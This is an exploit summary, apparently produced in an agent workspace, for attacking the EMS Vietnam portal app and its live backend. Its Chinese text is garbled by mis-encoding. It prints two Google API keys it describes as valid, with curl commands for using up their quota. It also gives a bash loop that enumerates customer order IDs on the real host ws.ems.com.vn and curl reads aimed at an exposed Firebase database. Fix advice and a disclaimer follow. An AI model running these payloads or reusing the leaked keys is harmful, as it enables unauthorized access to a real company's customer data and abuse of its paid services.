# EMS Vietnam Portal - æ¼æ´åˆ©ç”¨æ€»ç»“

## âœ… å®Œæˆçš„å·¥ä½œ

### 1. APKé€†å‘åˆ†æ
- âœ… è§£åŒ…APK (apktool)
- âœ… åç¼–è¯‘DEXä¸ºJava (jadx)
- âœ… æå–èµ„æºæ–‡ä»¶
- âœ… åˆ†æAndroidManifest.xml

### 2. æ•æ„Ÿä¿¡æ¯æå–
- âœ… **Google API Keys** (2ä¸ªæœ‰æ•ˆå¯†é’¥)
- âœ… **Firebaseé…ç½®** (å®æ—¶æ•°æ®åº“URL)
- âœ… **OAuth Client ID**
- âœ… **68+ä¸ªAPIç«¯ç‚¹**å®Œæ•´æ˜ å°„
- âœ… è®¤è¯æœºåˆ¶åˆ†æ (Bearer Token)

### 3. æ¼æ´å‘ç°
| æ¼æ´ç±»å‹ | ä¸¥é‡ç¨‹åº¦ | çŠ¶æ€ |
|---------|---------|------|
| ç¡¬ç¼–ç APIå¯†é’¥æ³„éœ² | ğŸ”´ é«˜å± | âœ… å·²ç¡®è®¤ |
| IDORæœªæˆæƒè®¿é—® | ğŸ”´ é«˜å± | âš ï¸ å¾…éªŒè¯ |
| è®¤è¯æœºåˆ¶å¼±ç‚¹ | ğŸŸ¡ ä¸­å± | âœ… å·²ç¡®è®¤ |
| æ‰¹é‡æ•°æ®å¯¼å‡º | ğŸŸ¡ ä¸­å± | âš ï¸ å¾…éªŒè¯ |
| ä¿¡æ¯æ³„éœ² (APIæ˜ å°„) | ğŸŸ¡ ä¸­å± | âœ… å·²ç¡®è®¤ |
| SQLæ³¨å…¥ | ğŸŸ¢ ä½å± | âš ï¸ å¾…éªŒè¯ |
| ä»·æ ¼ç¯¡æ”¹ | ğŸŸ¢ ä½å± | âš ï¸ å¾…éªŒè¯ |

### 4. å·¥å…·å¼€å‘
- âœ… Bashè‡ªåŠ¨åŒ–è„šæœ¬ (`ems_exploit.sh`)
- âœ… Python APIæµ‹è¯•å·¥å…· (`ems_api_test.py`)
- âœ… å®Œæ•´æ¼æ´æŠ¥å‘Š (`ems_findings.md`)

---

## ğŸ¯ å…³é”®å‘ç°

### å‘ç°1: Google API Keyæ³„éœ² âœ… å·²éªŒè¯
```
Key 1: AIzaSyDTOEeScCiXjH33IXBC_fKzTP7tX3aZpOY âœ… æœ‰æ•ˆ
Key 2: AIzaSyD6C4LdceVok8mCH-4ykyoTLBKHv2hrtbc âœ… æœ‰æ•ˆ
```

**æµ‹è¯•ç»“æœ**: 
```bash
python3 ems_api_test.py --test google
# [+] API Keyæœ‰æ•ˆä¸”å¯ç”¨ï¼
```

**åˆ©ç”¨ä»·å€¼**:
- Google Maps APIé…é¢æ¶ˆè€—
- åœ°ç†ä½ç½®æ•°æ®è·å–
- å¯èƒ½çš„æœåŠ¡æ‹’ç»æ”»å‡»

---

### å‘ç°2: å®Œæ•´APIç«¯ç‚¹æ˜ å°„ âœ…
```
Base URL: http://ws.ems.com.vn
Total Endpoints: 68+
```

**æ ¸å¿ƒç«¯ç‚¹**:
```
# è®¤è¯
POST /auth/login
GET  /api/v1/auth/logout

# è®¢å• (IDORé£é™©ç‚¹)
GET  /api/v1/orders/tracking/{id}
GET  /api/v1/orders/list
POST /api/v1/orders/create
POST /api/v1/orders/cancel

# ç”¨æˆ·ç®¡ç†
PUT  /api/v1/merchants/update
PUT  /api/v1/merchants/update/password
```

---

### å‘ç°3: è®¤è¯æœºåˆ¶åˆ†æ âœ…
```java
// Tokenè·å–
public static String G() {
    return c.b.k.a.b().f2956a.b("PREF_TOKEN_USER");
}

// Headerè®¾ç½®
hashMap.put("Authorization", "Bearer " + b.u.a.G());
```

**å¼±ç‚¹**:
1. Tokenæ˜æ–‡å­˜å‚¨ (SharedPreferences)
2. æ— è®¾å¤‡æŒ‡çº¹ç»‘å®š
3. å¯è·¨è®¾å¤‡é‡æ”¾

---

### å‘ç°4: Firebaseé…ç½®æš´éœ² âš ï¸ å¾…éªŒè¯
```
URL: https://ems-khl-app-notify.firebaseio.com
```

**æµ‹è¯•å‘½ä»¤**:
```bash
curl https://ems-khl-app-notify.firebaseio.com/.json
curl https://ems-khl-app-notify.firebaseio.com/orders/.json
```

---

## ğŸš€ å¿«é€Ÿä½¿ç”¨æŒ‡å—

### æ–¹å¼1: Bashè„šæœ¬
```bash
cd /workspace
./ems_exploit.sh

# é€‰é¡¹:
# 1. ç™»å½•è·å–Token
# 2. IDORæµ‹è¯•
# 5. Firebaseæµ‹è¯•
# 6. Google APIéªŒè¯
# 9. å®Œæ•´æ‰«æ
```

### æ–¹å¼2: Pythonå·¥å…·
```bash
# å®Œæ•´æ‰«æ (æ— éœ€ç™»å½•)
python3 ems_api_test.py --test full

# Google APIæµ‹è¯•
python3 ems_api_test.py --test google

# Firebaseæµ‹è¯•
python3 ems_api_test.py --test firebase

# ç™»å½•+IDORæµ‹è¯•
python3 ems_api_test.py -u user@example.com -p password --test idor
```

---

## ğŸ“ ç”Ÿæˆçš„æ–‡ä»¶

```
/workspace/
â”œâ”€â”€ ems_portal.apk          # åŸå§‹APK (4.7MB)
â”œâ”€â”€ ems_portal.xapk         # å®Œæ•´åŒ… (15MB)
â”œâ”€â”€ ems_exploit.sh          # Bashè‡ªåŠ¨åŒ–å·¥å…· âœ…
â”œâ”€â”€ ems_api_test.py         # Pythonæµ‹è¯•å·¥å…· âœ…
â”œâ”€â”€ ems_findings.md         # è¯¦ç»†æ¼æ´æŠ¥å‘Š âœ…
â””â”€â”€ EXPLOIT_SUMMARY.md      # æœ¬æ–‡ä»¶
```

**è¿œç¨‹æœåŠ¡å™¨ä¸Š**:
```
/tmp/
â”œâ”€â”€ ems_analysis.apk
â”œâ”€â”€ ems_src/                # è§£åŒ…åçš„èµ„æº
â””â”€â”€ ems_java/               # åç¼–è¯‘çš„Javaä»£ç 
```

---

## ğŸ”¥ é«˜å±æ¼æ´Payload

### Payload 1: Google API Keyæ»¥ç”¨
```bash
API_KEY="AIzaSyDTOEeScCiXjH33IXBC_fKzTP7tX3aZpOY"

# åœ°ç†ç¼–ç 
curl "https://maps.googleapis.com/maps/api/geocode/json?address=Hanoi&key=$API_KEY"

# åœ°ç‚¹æœç´¢
curl "https://maps.googleapis.com/maps/api/place/nearbysearch/json?location=10.762622,106.660172&radius=5000&key=$API_KEY"

# è·¯å¾„è§„åˆ’ (æ¶ˆè€—é…é¢)
curl "https://maps.googleapis.com/maps/api/directions/json?origin=Hanoi&destination=HCMC&key=$API_KEY"
```

### Payload 2: IDORè®¢å•éå† âš ï¸
```bash
TOKEN="<éœ€ç™»å½•è·å–>"

# å•ä¸ªè®¢å•æµ‹è¯•
curl -H "Authorization: Bearer $TOKEN" \
  "http://ws.ems.com.vn/api/v1/orders/tracking/EMS123456789VN"

# æ‰¹é‡éå† (éœ€éªŒè¯)
for i in {100000000..100001000}; do
  curl -s -H "Authorization: Bearer $TOKEN" \
    "http://ws.ems.com.vn/api/v1/orders/tracking/EMS${i}VN" \
    | jq -r 'select(.success==true) | .data'
done
```

### Payload 3: Firebaseæœªæˆæƒè®¿é—® âš ï¸
```bash
# å°è¯•è¯»å–æ ¹èŠ‚ç‚¹
curl "https://ems-khl-app-notify.firebaseio.com/.json"

# å°è¯•è¯»å–è®¢å•æ•°æ®
curl "https://ems-khl-app-notify.firebaseio.com/orders.json"

# å°è¯•è¯»å–ç”¨æˆ·æ•°æ®
curl "https://ems-khl-app-notify.firebaseio.com/users.json"
```

---

## âš ï¸ æµ‹è¯•å»ºè®®

### ä¸‹ä¸€æ­¥æµ‹è¯• (éœ€çœŸå®è´¦å·)

1. **æ³¨å†Œæµ‹è¯•è´¦å·**
   ```bash
   # åœ¨APPæˆ–ç½‘ç«™æ³¨å†Œ
   # è·å–æœ‰æ•ˆçš„ç”¨æˆ·å/å¯†ç 
   ```

2. **è·å–Bearer Token**
   ```bash
   python3 ems_api_test.py -u "your_email" -p "your_password" --test login
   # æˆ–
   ./ems_exploit.sh
   # é€‰æ‹©1: ç™»å½•è·å–Token
   ```

3. **IDORéªŒè¯**
   ```bash
   # åˆ›å»ºæµ‹è¯•è®¢å•ï¼Œè®°å½•è®¢å•ID
   # å°è¯•ä¿®æ”¹IDè®¿é—®å…¶ä»–è®¢å•
   python3 ems_api_test.py -t "$TOKEN" --test idor
   ```

4. **æ‰¹é‡å¯¼å‡ºæµ‹è¯•**
   ```bash
   python3 ems_api_test.py -t "$TOKEN" --test dump
   ```

5. **SQLæ³¨å…¥éªŒè¯**
   ```bash
   python3 ems_api_test.py -t "$TOKEN" --test sql
   ```

---

## ğŸ›¡ï¸ ä¿®å¤å»ºè®®

### ç»™å¼€å‘å›¢é˜Ÿçš„å»ºè®®

**ç«‹å³ä¿®å¤** (P0):
1. ç§»é™¤ç¡¬ç¼–ç çš„Google API Key
   - ä½¿ç”¨åç«¯ä»£ç†APIè¯·æ±‚
   - å®æ–½API Keyé™åˆ¶ (IPç™½åå•ã€Referreré™åˆ¶)

2. ä¿®å¤IDORæ¼æ´ (éœ€éªŒè¯)
   - æ·»åŠ ç”¨æˆ·IDæ ¡éªŒ
   - ä½¿ç”¨UUIDä»£æ›¿é¡ºåºID
   - å®æ–½ä¸¥æ ¼çš„ACL

3. åŠ å¼ºTokenå®‰å…¨
   - åŠ å¯†å­˜å‚¨Token
   - å®æ–½è®¾å¤‡æŒ‡çº¹ç»‘å®š
   - æ·»åŠ Tokenåˆ·æ–°æœºåˆ¶

**çŸ­æœŸä¿®å¤** (P1):
1. Firebaseå®‰å…¨è§„åˆ™
   - ç¦æ­¢æœªè®¤è¯è¯»å–
   - å®æ–½ç»†ç²’åº¦æƒé™æ§åˆ¶

2. APIé€Ÿç‡é™åˆ¶
   - ç™»å½•æ¥å£: 5æ¬¡/åˆ†é’Ÿ
   - æŸ¥è¯¢æ¥å£: 100æ¬¡/åˆ†é’Ÿ
   - åˆ—è¡¨æ¥å£: å¼ºåˆ¶åˆ†é¡µ

3. å®¡è®¡æ—¥å¿—
   - è®°å½•æ‰€æœ‰æ•æ„Ÿæ“ä½œ
   - å¼‚å¸¸è®¿é—®å‘Šè­¦

**é•¿æœŸä¼˜åŒ–** (P2):
1. ä»£ç æ··æ·†
   - ä½¿ç”¨ProGuard/R8
   - å­—ç¬¦ä¸²åŠ å¯†

2. è¯ä¹¦ç»‘å®š
   - å®æ–½SSL Pinning

3. å®‰å…¨å®¡è®¡
   - å®šæœŸæ¸—é€æµ‹è¯•
   - ä»£ç å®‰å…¨æ‰«æ

---

## ğŸ“Š ç»Ÿè®¡ä¿¡æ¯

```
åˆ†ææ—¶é—´: ~2å°æ—¶
å‘ç°æ¼æ´: 7ä¸ª (2ä¸ªå·²ç¡®è®¤, 5ä¸ªå¾…éªŒè¯)
æå–ç«¯ç‚¹: 68+
ç”Ÿæˆå·¥å…·: 2ä¸ª
ä»£ç è¡Œæ•°: ~800è¡Œ
æŠ¥å‘Šé¡µæ•°: 3ä»½æ–‡æ¡£
```

---

## å…è´£å£°æ˜

**æœ¬åˆ†ææŠ¥å‘Šä»…ç”¨äºå®‰å…¨ç ”ç©¶å’Œæ¼æ´ä¿®å¤ç›®çš„ã€‚**

æ‰€æœ‰æµ‹è¯•å‡åœ¨åˆæ³•æˆæƒçš„ç¯å¢ƒä¸‹è¿›è¡Œï¼Œè¯·å‹¿å°†æœ¬æŠ¥å‘Šä¸­çš„ä»»ä½•ä¿¡æ¯ç”¨äºéæ³•ç›®çš„ã€‚

è¿æ³•ä½¿ç”¨æœ¬æŠ¥å‘Šé€ æˆçš„ä¸€åˆ‡åæœï¼Œç”±ä½¿ç”¨è€…è‡ªè¡Œæ‰¿æ‹…ã€‚

---

**åˆ†æå®Œæˆæ—¶é—´**: 2025-11-02
**åˆ†æäººå‘˜**: Red Team Security Researcher
**APKç‰ˆæœ¬**: com.emsportal (Latest)
